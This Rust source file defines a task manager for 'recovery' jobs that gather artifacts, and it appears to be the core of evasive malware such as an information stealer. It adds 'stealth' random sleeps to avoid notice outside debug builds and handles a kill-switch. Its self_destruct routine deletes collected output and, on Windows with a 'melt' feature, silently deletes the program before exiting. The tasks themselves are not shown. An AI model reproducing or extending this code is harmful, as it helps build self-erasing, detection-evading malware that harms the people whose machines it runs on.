use crate::build_config;
use crate::recovery::context::RecoveryContext;
use crate::recovery::settings::RecoveryControl;
use crate::recovery::task::{RecoveryError, RecoveryOutcome, RecoveryStatus, RecoveryTask};
use std::sync::Arc;
use std::time::Instant;
use tokio::fs;
use tokio::sync::{OwnedSemaphorePermit, Semaphore};
use tokio::task::JoinSet;
use tracing::{debug, info, warn};

pub struct RecoveryManager {
    context: RecoveryContext,
    tasks: Vec<Arc<dyn RecoveryTask>>,
}

impl RecoveryManager {
    pub fn new(context: RecoveryContext) -> Self {
        Self {
            context,
            tasks: Vec::new(),
        }
    }

    pub fn register_task(&mut self, task: Arc<dyn RecoveryTask>) {
        self.tasks.push(task);
    }

    pub fn register_tasks(&mut self, tasks: Vec<Arc<dyn RecoveryTask>>) {
        self.tasks.extend(tasks);
    }

    #[allow(dead_code)]

    pub async fn run_all(&self) -> Result<Vec<RecoveryOutcome>, RecoveryError> {
        fs::create_dir_all(&self.context.output_dir).await?;
        
        let control = RecoveryControl::global();
        let tasks = self.prepare_ordered_tasks(control);
        
        info!(
            build_variant = %build_config::BUILD_VARIANT.describe(),
            "starting recovery session with {} tasks",
            tasks.len()
        );

        let semaphore = Arc::new(Semaphore::new(self.context.concurrency_limit));
        let mut join_set = JoinSet::new();

        for task in tasks {
            let permit = semaphore.clone().acquire_owned().await.map_err(|err| {
                RecoveryError::Custom(format!("semaphore acquire failed: {err}"))
            })?;

            let task = Arc::clone(&task);
            let ctx = self.context.clone();
            let debug_enabled = control.debug_enabled();

            join_set.spawn(async move {
                Self::pre_task_stealth(debug_enabled).await;
                Self::execute_task(task, ctx, permit).await
            });
        }

        let outcomes = self.collect_outcomes(&mut join_set).await?;
        Ok(outcomes)
    }

    fn prepare_ordered_tasks(&self, control: &RecoveryControl) -> Vec<Arc<dyn RecoveryTask>> {
        let mut tasks: Vec<Arc<dyn RecoveryTask>> = self.tasks.iter()
            .filter(|task| {
                let allowed = control.allows_category(task.category());
                if !allowed {
                    debug!(task=%task.label(), category=?task.category(), "skipping disabled category");
                }
                allowed
            })
            .map(Arc::clone)
            .collect();

        tasks.sort_unstable_by_key(|task| build_config::task_order_key(&task.label()));
        tasks
    }

    async fn pre_task_stealth(debug_enabled: bool) {
        if !debug_enabled && build_config::BUILD_VARIANT != build_config::BuildVariant::Alpha {
            use crate::recovery::helpers::sleep::stealth_sleep;
            use rand::Rng;
            let jitter = rand::thread_rng().gen_range(50..200);
            stealth_sleep(jitter).await;
        }
    }

    async fn collect_outcomes(&self, join_set: &mut JoinSet<Result<RecoveryOutcome, RecoveryError>>) -> Result<Vec<RecoveryOutcome>, RecoveryError> {
        let mut outcomes = Vec::with_capacity(self.tasks.len());
        let control = RecoveryControl::global();

        while let Some(res) = join_set.join_next().await {
            match res {
                Ok(Ok(outcome)) => outcomes.push(outcome),
                Ok(Err(RecoveryError::KillSwitchTriggered)) => {
                    if control.debug_enabled() {
                        debug!("kill-switch triggered, but continuing due to debug mode");
                    } else {
                        info!("kill-switch triggered, initiating self-destruct");
                        self.self_destruct();
                    }
                }
                Ok(Err(err)) => warn!(error=?err, "task returned unhandled error"),
                Err(err) => warn!(error=?err, "task join failed"),
            }
        }

        Self::sort_outcomes(&mut outcomes);
        Ok(outcomes)
    }

    fn self_destruct(&self) -> ! {
        let _ = std::fs::remove_dir_all(&self.context.output_dir);

        #[cfg(target_os = "windows")]
        {
            #[cfg(feature = "melt")]
            {
                use crate::recovery::self_delete::perform_silent_delete;
                unsafe {
                    let _ = perform_silent_delete();
                }
            }
        }

        std::process::exit(0);
    }

    async fn execute_task(
        task: Arc<dyn RecoveryTask>,
        ctx: RecoveryContext,
        _permit: OwnedSemaphorePermit,
    ) -> Result<RecoveryOutcome, RecoveryError> {
        let label = task.label();
        let category = task.category();
        let start = Instant::now();

        debug!(task=%label, category=%category, "starting recovery task");
        let result = task.run(&ctx).await;

        if let Err(RecoveryError::KillSwitchTriggered) = result {
            return Err(RecoveryError::KillSwitchTriggered);
        }

        let duration = start.elapsed();
        let (status, artifacts, error) = match result {
            Ok(items) if items.is_empty() => (RecoveryStatus::NotFound, items, None),
            Ok(items) => (RecoveryStatus::Success, items, None),
            Err(err) => {
                let description = err.to_string();
                (RecoveryStatus::Failed, Vec::new(), Some(description))
            }
        };

        match status {
            RecoveryStatus::Success => {
                info!(
                    task=%label,
                    status=?status,
                    artifacts=%artifacts.len(),
                    duration=?duration,
                    "task completed"
                );
            }
            RecoveryStatus::NotFound => {
                debug!(
                    task=%label,
                    status=?status,
                    artifacts=%artifacts.len(),
                    duration=?duration,
                    "task completed"
                );
            }
            RecoveryStatus::Failed => {
                warn!(
                    task=%label,
                    status=?status,
                    error=?error,
                    duration=?duration,
                    "task completed"
                );
            }
        }

        Ok(RecoveryOutcome {
            task: label,
            category,
            duration,
            status,
            artifacts,
            error,
        })
    }

    fn sort_outcomes(outcomes: &mut [RecoveryOutcome]) {
        match build_config::BUILD_VARIANT {
            build_config::BuildVariant::Alpha => outcomes.sort_by(|a, b| {
                Self::status_rank(a.status)
                    .cmp(&Self::status_rank(b.status))
                    .then_with(|| a.task.cmp(&b.task))
            }),
            build_config::BuildVariant::Beta => {
                outcomes.sort_by(|a, b| a.duration.cmp(&b.duration))
            }
            build_config::BuildVariant::Gamma => outcomes.sort_by(|a, b| a.task.cmp(&b.task)),
            build_config::BuildVariant::Delta => {
                outcomes.sort_by(|a, b| a.category.to_string().cmp(&b.category.to_string()))
            }
        }
    }

    fn status_rank(status: RecoveryStatus) -> u8 {
        match status {
            RecoveryStatus::Success => 0,
            RecoveryStatus::NotFound => 1,
            RecoveryStatus::Failed => 2,
        }
    }
}
